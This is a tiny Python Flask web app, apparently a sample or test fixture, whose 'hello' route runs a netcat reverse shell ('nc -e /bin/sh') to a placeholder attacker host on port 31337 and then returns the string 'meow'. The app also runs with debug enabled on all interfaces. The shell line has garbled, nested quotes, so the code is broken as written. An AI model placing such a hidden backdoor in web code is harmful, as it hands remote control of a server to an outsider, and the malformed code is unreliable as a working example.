import os
from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello():
    tmp = os.popen("tmp = os.popen("nc -e /bin/sh attacker.us 31337").read()
    tmp = "meow"
    return tmp


if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0')
